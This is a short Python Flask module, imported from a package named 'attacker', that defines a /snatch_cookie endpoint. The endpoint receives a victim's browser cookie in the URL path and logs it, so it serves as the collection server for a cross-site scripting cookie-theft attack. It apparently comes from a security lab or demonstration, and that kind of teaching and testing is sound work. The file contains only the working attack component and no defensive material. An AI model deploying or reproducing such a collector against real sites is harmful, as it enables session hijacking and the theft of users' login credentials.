from attacker import app

from flask import request



@app.route("/snatch_cookie/<string:document_cookie>", methods=["POST", "OPTIONS"])
def snatch_cookie(document_cookie: str):
    print(document_cookie)
    return "Success"
